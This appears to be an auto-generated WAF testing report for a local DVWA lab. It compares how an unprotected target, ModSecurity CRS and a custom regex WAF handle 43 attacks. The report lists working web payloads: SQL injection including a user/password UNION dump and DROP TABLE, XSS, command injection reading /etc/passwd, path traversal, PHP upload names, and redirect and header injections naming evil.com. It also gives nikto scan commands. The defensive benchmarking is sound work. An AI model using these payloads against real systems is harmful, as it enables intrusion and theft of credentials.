# Phase 4 — Testing Results
**Generated:** 2026-05-08 20:31 UTC  
**Total payloads fired:** 43 attacks + 13 legit requests per target

---

## Summary Table

| Target | Blocked | Bypassed | Block Rate | False Positives | Avg Latency |
|--------|---------|----------|------------|-----------------|-------------|
| Unprotected (8888) | 0/43 | 43 | **0.0%** | 0 | 53ms |
| ModSecurity (8080) | 33/43 | 10 | **76.7%** | 0 | 55ms |
| Custom WAF (8090) | 26/43 | 17 | **60.5%** | 0 | 94ms |

---

## Per-Target Detail

### Unprotected (8888)

- **Block rate:** 0.0%  
- **Blocked:** 0 / 43  
- **Bypassed:** 43  
- **False positives:** 0  
- **Avg response time:** 53ms  

#### Attack Results

| # | Label | Category | Status | Blocked |
|---|-------|----------|--------|---------|
| 1 | UNION SELECT dump | SQLi | 200 | 🟢 NO |
| 2 | Tautology OR 1=1 | SQLi | 200 | 🟢 NO |
| 3 | Tautology OR 1=1 #2 | SQLi | 200 | 🟢 NO |
| 4 | Quote error probe | SQLi | 200 | 🟢 NO |
| 5 | Blind SLEEP | SQLi | 200 | 🟢 NO |
| 6 | Comment sequence -- | SQLi | 200 | 🟢 NO |
| 7 | Stacked query attempt | SQLi | 200 | 🟢 NO |
| 8 | UNION 2-col | SQLi | 200 | 🟢 NO |
| 9 | Encoded UNION | SQLi | 200 | 🟢 NO |
| 10 | Boolean AND 1=2 | SQLi | 200 | 🟢 NO |
| 11 | POST SQLi username | SQLi | 200 | 🟢 NO |
| 12 | POST SQLi password | SQLi | 200 | 🟢 NO |
| 13 | Script tag alert | XSS | 200 | 🟢 NO |
| 14 | IMG onerror | XSS | 200 | 🟢 NO |
| 15 | SVG onload | XSS | 200 | 🟢 NO |
| 16 | javascript: URI | XSS | 200 | 🟢 NO |
| 17 | Event attr onfocus | XSS | 200 | 🟢 NO |
| 18 | Encoded script | XSS | 200 | 🟢 NO |
| 19 | document.cookie | XSS | 200 | 🟢 NO |
| 20 | iframe injection | XSS | 200 | 🟢 NO |
| 21 | Stored XSS message | XSS | 200 | 🟢 NO |
| 22 | Stored SVG payload | XSS | 200 | 🟢 NO |
| 23 | CMDI ping with ; ls | CMDI | 200 | 🟢 NO |
| 24 | CMDI cat /etc/passwd | CMDI | 200 | 🟢 NO |
| 25 | CMDI system() call | CMDI | 200 | 🟢 NO |
| 26 | CMDI backticks | CMDI | 200 | 🟢 NO |
| 27 | CMDI $() substitution | CMDI | 200 | 🟢 NO |
| 28 | LFI ../../etc/passwd | LFI | 200 | 🟢 NO |
| 29 | LFI php://input | LFI | 200 | 🟢 NO |
| 30 | LFI null byte | LFI | 200 | 🟢 NO |
| 31 | LFI encoded traversal | LFI | 200 | 🟢 NO |
| 32 | FUPL PHP file upload | FUPL | 200 | 🟢 NO |
| 33 | FUPL double ext | FUPL | 200 | 🟢 NO |
| 34 | FUPL PHP content | FUPL | 200 | 🟢 NO |
| 35 | REDIR external URL | REDIR | 200 | 🟢 NO |
| 36 | REDIR IP redirect | REDIR | 200 | 🟢 NO |
| 37 | HDR CRLF injection | HDR | 200 | 🟢 NO |
| 38 | HDR Host injection | HDR | 200 | 🟢 NO |
| 39 | BRUTE login attempt | BRUTE | 200 | 🟢 NO |
| 40 | XSS case variation | XSS | 200 | 🟢 NO |
| 41 | XSS double encode | XSS | 200 | 🟢 NO |
| 42 | SQLi space bypass | SQLi | 200 | 🟢 NO |
| 43 | SQLi comment bypass | SQLi | 200 | 🟢 NO |

#### ⚠️ Bypassed Payloads

- `1' UNION SELECT user,password FROM users-- -` — *UNION SELECT dump* (SQLi)
- `1' OR '1'='1` — *Tautology OR 1=1* (SQLi)
- `' OR 1=1--` — *Tautology OR 1=1 #2* (SQLi)
- `1'` — *Quote error probe* (SQLi)
- `1' AND SLEEP(1)-- -` — *Blind SLEEP* (SQLi)
- `1'-- -` — *Comment sequence --* (SQLi)
- `1'; DROP TABLE users--` — *Stacked query attempt* (SQLi)
- `0 UNION SELECT 1,2` — *UNION 2-col* (SQLi)
- `1%27%20UNION%20SELECT%201%2C2--` — *Encoded UNION* (SQLi)
- `1' AND 1=2--` — *Boolean AND 1=2* (SQLi)
- `admin'--` — *POST SQLi username* (SQLi)
- `' OR '1'='1` — *POST SQLi password* (SQLi)
- `<script>alert(1)</script>` — *Script tag alert* (XSS)
- `<img src=x onerror=alert(1)>` — *IMG onerror* (XSS)
- `<svg onload=alert(1)>` — *SVG onload* (XSS)
- `<a href=javascript:alert(1)>x</a>` — *javascript: URI* (XSS)
- `<input onfocus=alert(1) autofocus>` — *Event attr onfocus* (XSS)
- `%3Cscript%3Ealert(1)%3C/script%3E` — *Encoded script* (XSS)
- `<script>document.cookie</script>` — *document.cookie* (XSS)
- `<iframe src=javascript:alert(1)>` — *iframe injection* (XSS)
- `<script>alert('stored')</script>` — *Stored XSS message* (XSS)
- `<svg onload=alert(1)>` — *Stored SVG payload* (XSS)
- `127.0.0.1; ls` — *CMDI ping with ; ls* (CMDI)
- `127.0.0.1 | cat /etc/passwd` — *CMDI cat /etc/passwd* (CMDI)
- `127.0.0.1; system('whoami')` — *CMDI system() call* (CMDI)
- ``whoami`` — *CMDI backticks* (CMDI)
- `$(whoami)` — *CMDI $() substitution* (CMDI)
- `../../etc/passwd` — *LFI ../../etc/passwd* (LFI)
- `php://input` — *LFI php://input* (LFI)
- `../../etc/passwd%00` — *LFI null byte* (LFI)
- `%2e%2e%2f%2e%2e%2fetc%2fpasswd` — *LFI encoded traversal* (LFI)
- `filename="evil.php"` — *FUPL PHP file upload* (FUPL)
- `filename="shell.jpg.php"` — *FUPL double ext* (FUPL)
- `<?php echo 'evil'; ?>` — *FUPL PHP content* (FUPL)
- `https://evil.com` — *REDIR external URL* (REDIR)
- `192.168.1.1` — *REDIR IP redirect* (REDIR)
- `value
X-Injected: evil` — *HDR CRLF injection* (HDR)
- `X-Forwarded-Host: evil.com` — *HDR Host injection* (HDR)
- `admin&password=pass` — *BRUTE login attempt* (BRUTE)
- `<ScRiPt>alert(1)</sCrIpT>` — *XSS case variation* (XSS)
- `%253Cscript%253Ealert(1)%253C%252Fscript%253E` — *XSS double encode* (XSS)
- `1'/**/OR/**/1=1--` — *SQLi space bypass* (SQLi)
- `1'/*!OR*/1=1--` — *SQLi comment bypass* (SQLi)

#### Legitimate Requests

| # | Label | Method | Endpoint | Param | Value | Status | Blocked |
|---|-------|--------|----------|-------|-------|--------|---------|
| 1 | Home page | GET | / | - | - | 200 | ✅ NO |
| 2 | Login page load | GET | /login.php | - | - | 200 | ✅ NO |
| 3 | Setup page | GET | /setup.php | - | - | 200 | ✅ NO |
| 4 | SQLi page load | GET | /vulnerabilities/sqli/ | - | - | 200 | ✅ NO |
| 5 | XSS page load | GET | /vulnerabilities/xss_r/ | - | - | 200 | ✅ NO |
| 6 | Normal search | GET | /vulnerabilities/sqli/ | id | 1 | 200 | ✅ NO |
| 7 | Normal name | GET | /vulnerabilities/xss_r/ | name | Alice | 200 | ✅ NO |
| 8 | CMDI page load | GET | /vulnerabilities/exec/ | - | - | 200 | ✅ NO |
| 9 | Normal ping | GET | /vulnerabilities/exec/ | ip | 127.0.0.1 | 200 | ✅ NO |
| 10 | LFI page load | GET | /vulnerabilities/fi/ | - | - | 200 | ✅ NO |
| 11 | Normal include | GET | /vulnerabilities/fi/ | page | include.php | 200 | ✅ NO |
| 12 | FUPL page load | GET | /vulnerabilities/upload/ | - | - | 200 | ✅ NO |
| 13 | BRUTE page load | GET | /vulnerabilities/brute/ | - | - | 200 | ✅ NO |

✅ No false positives detected.

### ModSecurity (8080)

- **Block rate:** 76.7%  
- **Blocked:** 33 / 43  
- **Bypassed:** 10  
- **False positives:** 0  
- **Avg response time:** 55ms  

#### Attack Results

| # | Label | Category | Status | Blocked |
|---|-------|----------|--------|---------|
| 1 | UNION SELECT dump | SQLi | 403 | 🔴 YES |
| 2 | Tautology OR 1=1 | SQLi | 403 | 🔴 YES |
| 3 | Tautology OR 1=1 #2 | SQLi | 403 | 🔴 YES |
| 4 | Quote error probe | SQLi | 200 | 🟢 NO |
| 5 | Blind SLEEP | SQLi | 403 | 🔴 YES |
| 6 | Comment sequence -- | SQLi | 200 | 🟢 NO |
| 7 | Stacked query attempt | SQLi | 403 | 🔴 YES |
| 8 | UNION 2-col | SQLi | 403 | 🔴 YES |
| 9 | Encoded UNION | SQLi | 403 | 🔴 YES |
| 10 | Boolean AND 1=2 | SQLi | 403 | 🔴 YES |
| 11 | POST SQLi username | SQLi | 403 | 🔴 YES |
| 12 | POST SQLi password | SQLi | 403 | 🔴 YES |
| 13 | Script tag alert | XSS | 403 | 🔴 YES |
| 14 | IMG onerror | XSS | 403 | 🔴 YES |
| 15 | SVG onload | XSS | 403 | 🔴 YES |
| 16 | javascript: URI | XSS | 403 | 🔴 YES |
| 17 | Event attr onfocus | XSS | 403 | 🔴 YES |
| 18 | Encoded script | XSS | 403 | 🔴 YES |
| 19 | document.cookie | XSS | 403 | 🔴 YES |
| 20 | iframe injection | XSS | 403 | 🔴 YES |
| 21 | Stored XSS message | XSS | 403 | 🔴 YES |
| 22 | Stored SVG payload | XSS | 403 | 🔴 YES |
| 23 | CMDI ping with ; ls | CMDI | 403 | 🔴 YES |
| 24 | CMDI cat /etc/passwd | CMDI | 403 | 🔴 YES |
| 25 | CMDI system() call | CMDI | 403 | 🔴 YES |
| 26 | CMDI backticks | CMDI | 403 | 🔴 YES |
| 27 | CMDI $() substitution | CMDI | 403 | 🔴 YES |
| 28 | LFI ../../etc/passwd | LFI | 403 | 🔴 YES |
| 29 | LFI php://input | LFI | 403 | 🔴 YES |
| 30 | LFI null byte | LFI | 403 | 🔴 YES |
| 31 | LFI encoded traversal | LFI | 403 | 🔴 YES |
| 32 | FUPL PHP file upload | FUPL | 200 | 🟢 NO |
| 33 | FUPL double ext | FUPL | 200 | 🟢 NO |
| 34 | FUPL PHP content | FUPL | 403 | 🔴 YES |
| 35 | REDIR external URL | REDIR | 200 | 🟢 NO |
| 36 | REDIR IP redirect | REDIR | 200 | 🟢 NO |
| 37 | HDR CRLF injection | HDR | 200 | 🟢 NO |
| 38 | HDR Host injection | HDR | 200 | 🟢 NO |
| 39 | BRUTE login attempt | BRUTE | 200 | 🟢 NO |
| 40 | XSS case variation | XSS | 403 | 🔴 YES |
| 41 | XSS double encode | XSS | 200 | 🟢 NO |
| 42 | SQLi space bypass | SQLi | 403 | 🔴 YES |
| 43 | SQLi comment bypass | SQLi | 403 | 🔴 YES |

#### ⚠️ Bypassed Payloads

- `1'` — *Quote error probe* (SQLi)
- `1'-- -` — *Comment sequence --* (SQLi)
- `filename="evil.php"` — *FUPL PHP file upload* (FUPL)
- `filename="shell.jpg.php"` — *FUPL double ext* (FUPL)
- `https://evil.com` — *REDIR external URL* (REDIR)
- `192.168.1.1` — *REDIR IP redirect* (REDIR)
- `value
X-Injected: evil` — *HDR CRLF injection* (HDR)
- `X-Forwarded-Host: evil.com` — *HDR Host injection* (HDR)
- `admin&password=pass` — *BRUTE login attempt* (BRUTE)
- `%253Cscript%253Ealert(1)%253C%252Fscript%253E` — *XSS double encode* (XSS)

#### Legitimate Requests

| # | Label | Method | Endpoint | Param | Value | Status | Blocked |
|---|-------|--------|----------|-------|-------|--------|---------|
| 1 | Home page | GET | / | - | - | 200 | ✅ NO |
| 2 | Login page load | GET | /login.php | - | - | 200 | ✅ NO |
| 3 | Setup page | GET | /setup.php | - | - | 200 | ✅ NO |
| 4 | SQLi page load | GET | /vulnerabilities/sqli/ | - | - | 200 | ✅ NO |
| 5 | XSS page load | GET | /vulnerabilities/xss_r/ | - | - | 200 | ✅ NO |
| 6 | Normal search | GET | /vulnerabilities/sqli/ | id | 1 | 200 | ✅ NO |
| 7 | Normal name | GET | /vulnerabilities/xss_r/ | name | Alice | 200 | ✅ NO |
| 8 | CMDI page load | GET | /vulnerabilities/exec/ | - | - | 200 | ✅ NO |
| 9 | Normal ping | GET | /vulnerabilities/exec/ | ip | 127.0.0.1 | 200 | ✅ NO |
| 10 | LFI page load | GET | /vulnerabilities/fi/ | - | - | 200 | ✅ NO |
| 11 | Normal include | GET | /vulnerabilities/fi/ | page | include.php | 200 | ✅ NO |
| 12 | FUPL page load | GET | /vulnerabilities/upload/ | - | - | 200 | ✅ NO |
| 13 | BRUTE page load | GET | /vulnerabilities/brute/ | - | - | 200 | ✅ NO |

✅ No false positives detected.

### Custom WAF (8090)

- **Block rate:** 60.5%  
- **Blocked:** 26 / 43  
- **Bypassed:** 17  
- **False positives:** 0  
- **Avg response time:** 94ms  

#### Attack Results

| # | Label | Category | Status | Blocked |
|---|-------|----------|--------|---------|
| 1 | UNION SELECT dump | SQLi | 403 | 🔴 YES |
| 2 | Tautology OR 1=1 | SQLi | 403 | 🔴 YES |
| 3 | Tautology OR 1=1 #2 | SQLi | 403 | 🔴 YES |
| 4 | Quote error probe | SQLi | 200 | 🟢 NO |
| 5 | Blind SLEEP | SQLi | 403 | 🔴 YES |
| 6 | Comment sequence -- | SQLi | 403 | 🔴 YES |
| 7 | Stacked query attempt | SQLi | 403 | 🔴 YES |
| 8 | UNION 2-col | SQLi | 403 | 🔴 YES |
| 9 | Encoded UNION | SQLi | 403 | 🔴 YES |
| 10 | Boolean AND 1=2 | SQLi | 403 | 🔴 YES |
| 11 | POST SQLi username | SQLi | 403 | 🔴 YES |
| 12 | POST SQLi password | SQLi | 403 | 🔴 YES |
| 13 | Script tag alert | XSS | 403 | 🔴 YES |
| 14 | IMG onerror | XSS | 403 | 🔴 YES |
| 15 | SVG onload | XSS | 403 | 🔴 YES |
| 16 | javascript: URI | XSS | 403 | 🔴 YES |
| 17 | Event attr onfocus | XSS | 403 | 🔴 YES |
| 18 | Encoded script | XSS | 403 | 🔴 YES |
| 19 | document.cookie | XSS | 403 | 🔴 YES |
| 20 | iframe injection | XSS | 403 | 🔴 YES |
| 21 | Stored XSS message | XSS | 403 | 🔴 YES |
| 22 | Stored SVG payload | XSS | 403 | 🔴 YES |
| 23 | CMDI ping with ; ls | CMDI | 200 | 🟢 NO |
| 24 | CMDI cat /etc/passwd | CMDI | 200 | 🟢 NO |
| 25 | CMDI system() call | CMDI | 200 | 🟢 NO |
| 26 | CMDI backticks | CMDI | 200 | 🟢 NO |
| 27 | CMDI $() substitution | CMDI | 200 | 🟢 NO |
| 28 | LFI ../../etc/passwd | LFI | 200 | 🟢 NO |
| 29 | LFI php://input | LFI | 200 | 🟢 NO |
| 30 | LFI null byte | LFI | 200 | 🟢 NO |
| 31 | LFI encoded traversal | LFI | 200 | 🟢 NO |
| 32 | FUPL PHP file upload | FUPL | 200 | 🟢 NO |
| 33 | FUPL double ext | FUPL | 200 | 🟢 NO |
| 34 | FUPL PHP content | FUPL | 403 | 🔴 YES |
| 35 | REDIR external URL | REDIR | 200 | 🟢 NO |
| 36 | REDIR IP redirect | REDIR | 200 | 🟢 NO |
| 37 | HDR CRLF injection | HDR | 200 | 🟢 NO |
| 38 | HDR Host injection | HDR | 200 | 🟢 NO |
| 39 | BRUTE login attempt | BRUTE | 200 | 🟢 NO |
| 40 | XSS case variation | XSS | 403 | 🔴 YES |
| 41 | XSS double encode | XSS | 403 | 🔴 YES |
| 42 | SQLi space bypass | SQLi | 403 | 🔴 YES |
| 43 | SQLi comment bypass | SQLi | 403 | 🔴 YES |

#### ⚠️ Bypassed Payloads

- `1'` — *Quote error probe* (SQLi)
- `127.0.0.1; ls` — *CMDI ping with ; ls* (CMDI)
- `127.0.0.1 | cat /etc/passwd` — *CMDI cat /etc/passwd* (CMDI)
- `127.0.0.1; system('whoami')` — *CMDI system() call* (CMDI)
- ``whoami`` — *CMDI backticks* (CMDI)
- `$(whoami)` — *CMDI $() substitution* (CMDI)
- `../../etc/passwd` — *LFI ../../etc/passwd* (LFI)
- `php://input` — *LFI php://input* (LFI)
- `../../etc/passwd%00` — *LFI null byte* (LFI)
- `%2e%2e%2f%2e%2e%2fetc%2fpasswd` — *LFI encoded traversal* (LFI)
- `filename="evil.php"` — *FUPL PHP file upload* (FUPL)
- `filename="shell.jpg.php"` — *FUPL double ext* (FUPL)
- `https://evil.com` — *REDIR external URL* (REDIR)
- `192.168.1.1` — *REDIR IP redirect* (REDIR)
- `value
X-Injected: evil` — *HDR CRLF injection* (HDR)
- `X-Forwarded-Host: evil.com` — *HDR Host injection* (HDR)
- `admin&password=pass` — *BRUTE login attempt* (BRUTE)

#### Legitimate Requests

| # | Label | Method | Endpoint | Param | Value | Status | Blocked |
|---|-------|--------|----------|-------|-------|--------|---------|
| 1 | Home page | GET | / | - | - | 200 | ✅ NO |
| 2 | Login page load | GET | /login.php | - | - | 200 | ✅ NO |
| 3 | Setup page | GET | /setup.php | - | - | 200 | ✅ NO |
| 4 | SQLi page load | GET | /vulnerabilities/sqli/ | - | - | 200 | ✅ NO |
| 5 | XSS page load | GET | /vulnerabilities/xss_r/ | - | - | 200 | ✅ NO |
| 6 | Normal search | GET | /vulnerabilities/sqli/ | id | 1 | 200 | ✅ NO |
| 7 | Normal name | GET | /vulnerabilities/xss_r/ | name | Alice | 200 | ✅ NO |
| 8 | CMDI page load | GET | /vulnerabilities/exec/ | - | - | 200 | ✅ NO |
| 9 | Normal ping | GET | /vulnerabilities/exec/ | ip | 127.0.0.1 | 200 | ✅ NO |
| 10 | LFI page load | GET | /vulnerabilities/fi/ | - | - | 200 | ✅ NO |
| 11 | Normal include | GET | /vulnerabilities/fi/ | page | include.php | 200 | ✅ NO |
| 12 | FUPL page load | GET | /vulnerabilities/upload/ | - | - | 200 | ✅ NO |
| 13 | BRUTE page load | GET | /vulnerabilities/brute/ | - | - | 200 | ✅ NO |

✅ No false positives detected.

---

## Analysis Notes

*(Fill in after reviewing results)*

- **Unprotected:** All attacks pass through — baseline confirms DVWA is genuinely vulnerable.
- **ModSecurity CRS:** Industry-standard rule set. Note any bypasses and which CRS rules fired.
- **Custom WAF:** Regex-based detection. Compare bypass patterns vs ModSecurity — useful for the report's comparison section.

---

## Nikto Scan Commands

Run these after the automated script to add depth to Phase 4:

```bash
# Unprotected
nikto -h http://localhost:8888 -output zap-reports/nikto-unprotected.txt

# ModSecurity WAF
nikto -h http://localhost:8080 -output zap-reports/nikto-modsecurity.txt

# Custom WAF
nikto -h http://localhost:8090 -output zap-reports/nikto-custom-waf.txt
```

Compare the number of vulnerabilities found across all three — fewer findings behind the WAFs = better protection.
